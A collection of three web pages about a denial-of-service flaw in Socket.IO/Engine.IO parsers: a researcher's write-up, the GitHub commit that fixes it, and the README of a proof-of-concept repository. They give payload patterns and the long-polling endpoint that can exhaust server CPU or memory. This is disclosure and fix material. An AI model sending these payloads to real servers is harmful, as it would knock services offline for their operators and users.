=== Content from blog.caller.xyz_d662192e_20250119_112010.html ===

[Skip to main content](#skip)
[ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ](/)
## Top level navigation menu

* [Home](/)
* [Archive](/blog/)
* [About Me](/about/)

# SocketIO / EngineIO DoS

* 2020年05月
* [security](/tags/security/),
* [poc](/tags/poc/),
* [research](/tags/research/),
* [nodejs](/tags/nodejs/),
* [python](/tags/python/)

Quite a while ago, I reported an application Denial of Service vulnerability in the Socket.IO / Engine.IO parser implementations in nodejs and python.
A single HTTP POST request can cause extreme CPU and memory usage, but in nodejs, a single HTTP POST request can even kill the server with a `Javascript heap out of memory` fatal error.

I assume some of what I've written is incorrect as I'm not an expert on v8 internals, but I do really love getting to the bottom of edge-case performance issues.

# Protocol [#](#protocol)

The [engine.io protocol](https://github.com/socketio/engine.io-protocol) allows bi-directional communication between a server and client, abstracting away the actual transport. The transport can be WebSockets, but if that isn't supported then another transport such as HTTP long polling is possible.

When the WebSocket transport is used, packets are encapsulated by the engine.io protocol. First there is a number specifying the [packet type](https://github.com/socketio/engine.io-protocol#packet). For instance, ping packets starting with `2` are sent as WebSocket data even though WebSocket has its own heartbeat mechanism. Sending the JSON data `{"a": 123}` requires prefixing with a `4`. The socket.io protocol on top of that, if used, will add a `2` prefix meaning [EVENT](https://github.com/socketio/socket.io-protocol#packet), so a WebSocket listener will receive `"42{\"a\":123}"`.

Using the long-polling transport, a payload containing multiple packets can be sent. In [version 3 of the protocol](https://github.com/socketio/engine.io-protocol/tree/v3#payload), the payload is encoded as:

```
<length1>:<packet1>[<length2>:<packet2>[...]]

```

e.g `6:42[{}]11:4abcdefghij1:2` contains 3 packets:

1. Socket.io packet of length 6: Message (4), Event (2, `[{}]`)
2. Packet of length 11: Message (4), Data (`abcdefghij`)
3. Packet of length 1: Ping (2)

With WebSockets, the 3 packets would be sent separately. With HTTP long polling, the payload would be POSTed to `http(s)://host/socket.io/?EIO=3&transport=polling&sid=$SESSIONID`.

The denial-of-service bug lies in:

* Inefficient parsing of packets from payloads
* Maximum HTTP body size of 100MB

# Make your 100MB count [#](#make-your-100mb-count)

You can send a payload containing 1e8 bytes to the server. That's quite a huge message, but how can we cause the server the most pain and suffering?
The main methods are:

* **Many tiny packets**: send 25,000,000 empty event packets `2:422:422:422:42`
* **One giant int**: send the largest possible packet with integer data `99999991:42222222222222222222...`
* **Many heartbeats**: send 33,333,333 ping packets `1:21:21:21:2...`

Loading the body string into memory automatically eats up 100MB as a starting point, but it gets a hell of a lot worse.

# Nodejs [#](#nodejs)

With NodeJS, if the ping timeout (default 30s) is exceeded then the processing appears to be cancelled. Therefore, sending a payload which is so large it doesn't reach the memory exhausting step within the ping timeout will not kill the process. It will just waste CPU for 30 seconds. Sending a slightly smaller payload instead may cause the process to exit.

## Many tiny packets [#](#many-tiny-packets)

The bug here is due to [this 2016 change](https://github.com/socketio/socket.io/commit/e60bd5a4da9173acba7553c9e631b79770a8c8be). As the parser reads packets from the payload, it doesn't emit the `socket.onpacket` event immediately. Instead it queues up a new closure with `process.nextTick`. Since the next tick of the event loop doesn't come until all packets have been parsed, memory usage blows up.

‌![FixedQueue retaining many closures to be executed before the next tick](/img/Y-8Vu___o9-1200.png)

FixedQueue retaining many closures to be executed before the next tick

`process.nextTick` stores the closures in [FixedCircularBuffers inside a FixedQueue](https://github.com/nodejs/node/blob/master/lib/internal/fixed_queue.js). Each of these closures retains 200 bytes of heap memory (retained means that if this closure could be garbage collected, it would free this amount of heap memory). Not a lot per closure (no giant objects retained), but it adds up to ~5gb.

‌![A huge number of closures. Closure code (96 bytes) + context (64 bytes) + packet (72 - 32 due to double counting) = 200 bytes](/img/wkytSCdtpO-1200.png)

A huge number of closures. Closure code (96 bytes) + context (64 bytes) + packet (72 - 32 due to double counting) = 200 bytes

## One giant integer [#](#one-giant-integer)

This is best explained by looking at [my fix](https://github.com/socketio/socket.io-parser/commit/dcb942d24db97162ad16a67c2a0cf30875342d55).

Luckily string concatenation in v8 doesn't create an entirely new string like in some languages where string builders are required. Instead, `a + b` becomes `ConsString { first = a, second = b }` pointing to the two smaller strings. There are even optimised versions `ConsOneByteString` and `ConsTwoByteString`.

Sending the "One giant int" packet can cause OOM via building up many many
`ConsOneByteString` objects (32 bytes each) due to concatenation:
99999989 `ConsOneByteString`s and then converting the massive integer to
a `Number`.

‌![ConsOneByteString](/img/AVEvjBVShA-1200.png)

ConsOneByteString

```
==== JS stack trace =========================================

    0: ExitFrame [pc: 0x13c5b79]
Security context: 0x152fe7b808d1 <JSObject>
    1: decodeString [0x2dd385fb5d1] [/node_modules/socket.io-parser/index.js:~276] [pc=0xf59746881be](this=0x175d34c42b69 <JSGlobal Object>,0x14eccff10fe1 <Very long string[69999990]>)
    2: add [0x31fc2693da29] [/node_modules/socket.io-parser/index.js:242] [bytecode=0xa7ed6554889 offset=11](this=0x0a2881be5069 <Decoder map = 0x3ceaa8bf48c9>,0x14eccff10fe1 <Very...

FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
 1: 0xa09830 node::Abort() [node]
 2: 0xa09c55 node::OnFatalError(char const*, char const*) [node]
 3: 0xb7d71e v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]
 4: 0xb7da99 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]
 5: 0xd2a1f5  [node]
 6: 0xd2a886 v8::internal::Heap::RecomputeLimits(v8::internal::GarbageCollector) [node]
 7: 0xd37105 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) [node]
 8: 0xd37fb5 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]
 9: 0xd3965f v8::internal::Heap::HandleGCRequest() [node]
10: 0xce8395 v8::internal::StackGuard::HandleInterrupts() [node]
11: 0x1042cb6 v8::internal::Runtime_StackGuard(int, unsigned long*, v8::internal::Isolate*) [node]
12: 0x13c5b79  [node]
```
## Many heartbeats [#](#many-heartbeats)

This causes OOM as many pongs are created to reply to all the pings.

# Python [#](#python)

With eventlet, a single payload can DoS the entire server until processing completes due to the absence of `eventlet.sleep` calls. Without eventlet, the non-production server remains responsive until the thread pool is exhausted, so requires more than 1 concurrent request.

## Many tiny packets (special) [#](#many-tiny-packets-special)

Payload: `2:4¼2:4¼2:4¼2:4¼2:4¼2:4¼...`

When non-ascii characters are present in the payload,

```
encoded_payload.decode('utf-8', errors='ignore')
```

is much slower:

```
export N=100000; python -m timeit -s "x=b'2:42' * $N" "x.decode('utf-8', errors='ignore')"; python -m timeit -s "x=b'2:4\xbc' * $N" "x.decode('utf-8', errors='ignore')";
10000 loops, best of 3: 37.6 usec per loop
10 loops, best of 3: 29.3 msec per loop

export N=10000000; python -m timeit -s "x=b'2:42' * $N" "x.decode('utf-8', errors='ignore')"; python -m timeit -s "x=b'2:4\xbc' * $N" "x.decode('utf-8', errors='ignore')";
100 loops, best of 3: 9.08 msec per loop
10 loops, best of 3: 2.95 sec per loop
```

As engineio reads a packet, it decodes the entire remaining payload and
then advances the length of the packet. So for an N-packet payload, the
decode function is applied to:

* (string of N packets)
* (string of N-1 packets)
* (string of N-2 packets)

so slowing down the decoding makes the DoS much more potent as it's O(n2)!

This was [fixed by the maintainer](https://github.com/miguelgrinberg/python-engineio/commit/64a34fc1550458ded57014301d5f9e97534f0843#diff-a2b90c63f58ef76954869020513f8e9bL72).

## All others [#](#all-others)

The python code seems to generally run slower than the nodejs code. Large payloads cause DoS primarily by wasting CPU time since python doesn't have a max heap size in the same way as v8. One giant int is slow as `int("2" * int(1e7))` is incredibly slow in python, perhaps because it allows Unicode digits like ٣ as well.

# Exploit [#](#exploit)

I made a repo [![:octocat:](https://github.githubassets.com/images/icons/emoji/octocat.png?v8)bcaller/kill-engine-io](https://github.com/bcaller/kill-engine-io) containing test servers and code to trigger the DoS. Enjoy.

Servers with a lower max HTTP body size are less vulnerable. In fact, the default has been lowered in newer versions.

* Previous: [v380 IPcam: Firmware patching](/v380-ipcam-firmware-patching/)
* Next: [我們都不完美](/wo-men-du-bu-wan-mei/)



=== Content from github.com_5d61c7a8_20250119_112012.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsocketio%2Fsocket.io-parser%2Fcommit%2Fdcb942d24db97162ad16a67c2a0cf30875342d55)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsocketio%2Fsocket.io-parser%2Fcommit%2Fdcb942d24db97162ad16a67c2a0cf30875342d55)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=socketio%2Fsocket.io-parser)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[socketio](/socketio)
/
**[socket.io-parser](/socketio/socket.io-parser)**
Public

* [Notifications](/login?return_to=%2Fsocketio%2Fsocket.io-parser) You must be signed in to change notification settings
* [Fork
  105](/login?return_to=%2Fsocketio%2Fsocket.io-parser)
* [Star
   138](/login?return_to=%2Fsocketio%2Fsocket.io-parser)

* [Code](/socketio/socket.io-parser)
* [Issues
  0](/socketio/socket.io-parser/issues)
* [Pull requests
  1](/socketio/socket.io-parser/pulls)
* [Actions](/socketio/socket.io-parser/actions)
* [Security](/socketio/socket.io-parser/security)
* [Insights](/socketio/socket.io-parser/pulse)

Additional navigation options

* [Code](/socketio/socket.io-parser)
* [Issues](/socketio/socket.io-parser/issues)
* [Pull requests](/socketio/socket.io-parser/pulls)
* [Actions](/socketio/socket.io-parser/actions)
* [Security](/socketio/socket.io-parser/security)
* [Insights](/socketio/socket.io-parser/pulse)

## Commit

[Permalink](/socketio/socket.io-parser/commit/dcb942d24db97162ad16a67c2a0cf30875342d55)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: prevent DoS (OOM) via massive packets ([#95](https://github.com/socketio/socket.io-parser/pull/95))

[Browse files](/socketio/socket.io-parser/tree/dcb942d24db97162ad16a67c2a0cf30875342d55)
Browse the repository at this point in the history

```
When maxHttpBufferSize is large (1e8 bytes), a payload of length 100MB
can be sent like so:

99999991:422222222222222222222222222222222222222222222...

This massive packet can cause OOM via building up many many
`ConsOneByteString` objects due to concatenation:
99999989 `ConsOneByteString`s and then converting the massive integer to
a `Number`.

The performance can be improved to avoid this by using `substring`
rather than building the string via concatenation.

Below I tried one payload of length 7e7 as the 1e8 payload took so
long to process that it timed out before running out of memory.

```
==== JS stack trace =========================================

    0: ExitFrame [pc: 0x13c5b79]
Security context: 0x152fe7b808d1 <JSObject>
    1: decodeString [0x2dd385fb5d1] [/node_modules/socket.io-parser/index.js:~276] [pc=0xf59746881be](this=0x175d34c42b69 <JSGlobal Object>,0x14eccff10fe1 <Very long string[69999990]>)
    2: add [0x31fc2693da29] [/node_modules/socket.io-parser/index.js:242] [bytecode=0xa7ed6554889 offset=11](this=0x0a2881be5069 <Decoder map = 0x3ceaa8bf48c9>,0x14eccff10fe1 <Very...

FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
 1: 0xa09830 node::Abort() [node]
 2: 0xa09c55 node::OnFatalError(char const*, char const*) [node]
 3: 0xb7d71e v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]
 4: 0xb7da99 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]
 5: 0xd2a1f5  [node]
 6: 0xd2a886 v8::internal::Heap::RecomputeLimits(v8::internal::GarbageCollector) [node]
 7: 0xd37105 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) [node]
 8: 0xd37fb5 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]
 9: 0xd3965f v8::internal::Heap::HandleGCRequest() [node]
10: 0xce8395 v8::internal::StackGuard::HandleInterrupts() [node]
11: 0x1042cb6 v8::internal::Runtime_StackGuard(int, unsigned long*, v8::internal::Isolate*) [node]
12: 0x13c5b79  [node]
```
```

* Loading branch information

[![@bcaller](https://avatars.githubusercontent.com/u/5838651?s=40&v=4)](/bcaller)

[bcaller](/socketio/socket.io-parser/commits?author=bcaller "View all commits by bcaller")
authored
May 13, 2020

1 parent
[a5d0435](/socketio/socket.io-parser/commit/a5d04354e6e98b5318d5276123b0b5a5e698bf8e)

commit dcb942d

Showing
**1 changed file**
with
**7 additions**
and
**10 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

17 changes: 7 additions & 10 deletions

17
[index.js](#diff-e727e4bdf3657fd1d798edcd6b099d6e092f8573cba266154583a746bba0f346 "index.js")

Show comments

[View file](/socketio/socket.io-parser/blob/dcb942d24db97162ad16a67c2a0cf30875342d55/index.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -286,11 +286,9 @@ function decodeString(str) { |
|  |  |  |
|  |  | // look up attachments if type binary |
|  |  | if (exports.BINARY\_EVENT === p.type || exports.BINARY\_ACK === p.type) { |
|  |  | var buf = ''; |
|  |  | while (str.charAt(++i) !== '-') { |
|  |  | buf += str.charAt(i); |
|  |  | if (i == str.length) break; |
|  |  | } |
|  |  | var start = i + 1; |
|  |  | while (str.charAt(++i) !== '-' && i != str.length) {} |
|  |  | var buf = str.substring(start, i); |
|  |  | if (buf != Number(buf) || str.charAt(i) !== '-') { |
|  |  | throw new Error('Illegal attachments'); |
|  |  | } |
| Expand All | | @@ -299,31 +297,30 @@ function decodeString(str) { |
|  |  |  |
|  |  | // look up namespace (if any) |
|  |  | if ('/' === str.charAt(i + 1)) { |
|  |  | p.nsp = ''; |
|  |  | var start = i + 1; |
|  |  | while (++i) { |
|  |  | var c = str.charAt(i); |
|  |  | if (',' === c) break; |
|  |  | p.nsp += c; |
|  |  | if (i === str.length) break; |
|  |  | } |
|  |  | p.nsp = str.substring(start, i); |
|  |  | } else { |
|  |  | p.nsp = '/'; |
|  |  | } |
|  |  |  |
|  |  | // look up id |
|  |  | var next = str.charAt(i + 1); |
|  |  | if ('' !== next && Number(next) == next) { |
|  |  | p.id = ''; |
|  |  | var start = i + 1; |
|  |  | while (++i) { |
|  |  | var c = str.charAt(i); |
|  |  | if (null == c || Number(c) != c) { |
|  |  | --i; |
|  |  | break; |
|  |  | } |
|  |  | p.id += str.charAt(i); |
|  |  | if (i === str.length) break; |
|  |  | } |
|  |  | p.id = Number(p.id); |
|  |  | p.id = Number(str.substring(start, i + 1)); |
|  |  | } |
|  |  |  |
|  |  | // look up json data |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 1 comment on commit `dcb942d`

[![@abergmann](https://avatars.githubusercontent.com/u/4102163?s=80&v=4)](/abergmann)

Copy link

### @abergmann **[abergmann](/abergmann)** commented on `[dcb942d](/socketio/socket.io-parser/commit/dcb942d24db97162ad16a67c2a0cf30875342d55)` [Jan 8, 2021](#commitcomment-45759977)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

[CVE-2020-36049](https://nvd.nist.gov/vuln/detail/CVE-2020-36049) was assigned to this commit.

Sorry, something went wrong.

 👍
3
 darrachequesne, AlBannaTechno, and hktalent reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsocketio%2Fsocket.io-parser%2Fcommit%2Fdcb942d24db97162ad16a67c2a0cf30875342d55) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_b7f1601e_20250119_112011.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbcaller%2Fkill-engine-io)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbcaller%2Fkill-engine-io)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=bcaller%2Fkill-engine-io)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[bcaller](/bcaller)
/
**[kill-engine-io](/bcaller/kill-engine-io)**
Public

* [Notifications](/login?return_to=%2Fbcaller%2Fkill-engine-io) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2Fbcaller%2Fkill-engine-io)
* [Star
   7](/login?return_to=%2Fbcaller%2Fkill-engine-io)

DoS python-engineio / socketio via the long polling transport

[7
stars](/bcaller/kill-engine-io/stargazers) [3
forks](/bcaller/kill-engine-io/forks) [Branches](/bcaller/kill-engine-io/branches) [Tags](/bcaller/kill-engine-io/tags) [Activity](/bcaller/kill-engine-io/activity)
 [Star](/login?return_to=%2Fbcaller%2Fkill-engine-io)

 [Notifications](/login?return_to=%2Fbcaller%2Fkill-engine-io) You must be signed in to change notification settings

* [Code](/bcaller/kill-engine-io)
* [Issues
  0](/bcaller/kill-engine-io/issues)
* [Pull requests
  1](/bcaller/kill-engine-io/pulls)
* [Actions](/bcaller/kill-engine-io/actions)
* [Projects
  0](/bcaller/kill-engine-io/projects)
* [Security](/bcaller/kill-engine-io/security)
* [Insights](/bcaller/kill-engine-io/pulse)

Additional navigation options

* [Code](/bcaller/kill-engine-io)
* [Issues](/bcaller/kill-engine-io/issues)
* [Pull requests](/bcaller/kill-engine-io/pulls)
* [Actions](/bcaller/kill-engine-io/actions)
* [Projects](/bcaller/kill-engine-io/projects)
* [Security](/bcaller/kill-engine-io/security)
* [Insights](/bcaller/kill-engine-io/pulse)

# bcaller/kill-engine-io

    master[Branches](/bcaller/kill-engine-io/branches)[Tags](/bcaller/kill-engine-io/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[26 Commits](/bcaller/kill-engine-io/commits/master/) | | |
| [templates](/bcaller/kill-engine-io/tree/master/templates "templates") | | [templates](/bcaller/kill-engine-io/tree/master/templates "templates") |  |  |
| [Dockerfile.kill-socket-io](/bcaller/kill-engine-io/blob/master/Dockerfile.kill-socket-io "Dockerfile.kill-socket-io") | | [Dockerfile.kill-socket-io](/bcaller/kill-engine-io/blob/master/Dockerfile.kill-socket-io "Dockerfile.kill-socket-io") |  |  |
| [Dockerfile.node-server](/bcaller/kill-engine-io/blob/master/Dockerfile.node-server "Dockerfile.node-server") | | [Dockerfile.node-server](/bcaller/kill-engine-io/blob/master/Dockerfile.node-server "Dockerfile.node-server") |  |  |
| [README.md](/bcaller/kill-engine-io/blob/master/README.md "README.md") | | [README.md](/bcaller/kill-engine-io/blob/master/README.md "README.md") |  |  |
| [kill\_socket\_io.py](/bcaller/kill-engine-io/blob/master/kill_socket_io.py "kill_socket_io.py") | | [kill\_socket\_io.py](/bcaller/kill-engine-io/blob/master/kill_socket_io.py "kill_socket_io.py") |  |  |
| [requirements.txt](/bcaller/kill-engine-io/blob/master/requirements.txt "requirements.txt") | | [requirements.txt](/bcaller/kill-engine-io/blob/master/requirements.txt "requirements.txt") |  |  |
| [serve.js](/bcaller/kill-engine-io/blob/master/serve.js "serve.js") | | [serve.js](/bcaller/kill-engine-io/blob/master/serve.js "serve.js") |  |  |
| [serve.py](/bcaller/kill-engine-io/blob/master/serve.py "serve.py") | | [serve.py](/bcaller/kill-engine-io/blob/master/serve.py "serve.py") |  |  |
| View all files | | |

## Repository files navigation

* README
# kill-engine-io

[Blog post](https://blog.caller.xyz/socketio-engineio-dos/)

DoS [python-engineio](https://github.com/miguelgrinberg/python-engineio) / [python-socketio](https://github.com/miguelgrinberg/python-socketio) / [Flask-SocketIO](https://github.com/miguelgrinberg/Flask-SocketIO) via the long polling transport with a single POST request. Also nodejs [socket.io-parser](https://github.com/socketio/socket.io-parser) can be DoSed via the same transport.

By default engineio's `max_http_buffer_size` is set to [1e8 = 100MB](https://github.com/miguelgrinberg/python-engineio/blob/bb2401354c3b7c3cf6a5577db83cc51ae071836e/engineio/server.py#L84) bytes.
This is the maximum size of a request to the long polling transport.
The comment at [payload.py](https://github.com/miguelgrinberg/python-engineio/blob/bb2401354c3b7c3cf6a5577db83cc51ae071836e/engineio/payload.py#L65)
alludes to a DoS vulnerability.

```
                # extracting the packet out of the payload is extremely
                # inefficient, because the payload needs to be treated as
                # binary, but the non-binary packets have to be parsed as
                # unicode. Luckily this complication only applies to long
                # polling, as the websocket transport sends packets
                # individually wrapped.

```

kill\_socket\_io.py sends a large payload which tries to abuse this code path
and cause the server to hang on full CPU usage.

The payload contains many small packets (processing is O(n^2) in number of packets).
See [my commit message](https://github.com/bcaller/kill-engine-io/commit/bd5f433335a45ecf1766cc462d0571a56d8f8b4f)
for explanation of non-ASCII character to abuse `encoded_payload.decode('utf-8', errors='ignore')` in versions 3.9.3 and below.

Payload: `2:4¼2:4¼2:4¼2:4¼2:4¼2:4¼...`

Versions above 3.9.3 don't use `errors='ignore'` so we don't put non-ASCII characters in.

Payload `many_tiny_packets`: `2:422:422:422:422:422:42...`

From 3.10.0, the number of packets in a payload was capped at 16 (non-configurable) as a response to my vulnerability report.
An alternative is to send one giant packet with an integer payload:

Payload `giant_packet`: `99999991:42222222222222222222...`

which abuses the socketio protocol [see python-socketio](https://github.com/miguelgrinberg/python-socketio/blob/a839a36fa0fa7f0e5d8976ff47b217f6b1e8a44b/socketio/packet.py#L109).

## NodeJS specifics

The NodeJS implementation of [engineio-parser](https://github.com/socketio/engine.io-parser) appears much faster and less easy to DoS. Node implementations have non-hexadecimal characters in the session id, so you should be able to instantly see if the server is python backed or not.

While faster, the NodeJS implementation can actually be OOMed with the node process exitting with error `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`. With NodeJS, if the ping timeout (default 30s) is exceeded then the processing appears to be cancelled. Therefore, sending a payload which is so large it doesn't reach the memory exhausting step within the ping timeout will not kill the process. It will just waste CPU for 30 seconds. Sending a slightly smaller payload (5e7 worked for me) caused the process to exit.

```
==== JS stack trace =========================================

    0: ExitFrame [pc: 0x5fafab4fc5d]
    1: StubFrame [pc: 0x5fafab50fca]
Security context: 0x3878b7d1d971 <JSObject>
    2: decodeString [0x3bee6a8562b1] [/engineio-test/node_modules/socket.io-parser/index.js:~276] [pc=0x5fafabfaf7e](this=0x21aef10845b1 <JSGlobal Object>,0x1dfe93882e59 <Very long string[49999990]>)
    3: /* anonymous */ [0x3deb4ecca739] [/engineio-test/node_modules/socket.io-parser/index.js:242...

FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory

Writing Node.js report to file: report.20191002.184025.9877.001.json
Node.js report completed
 1: 0x953b10 node::Abort() [node]
 2: 0x9547f4 node::OnFatalError(char const*, char const*) [node]
 3: 0xb32bee v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]
 4: 0xb32e24 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]
 5: 0xf32452  [node]
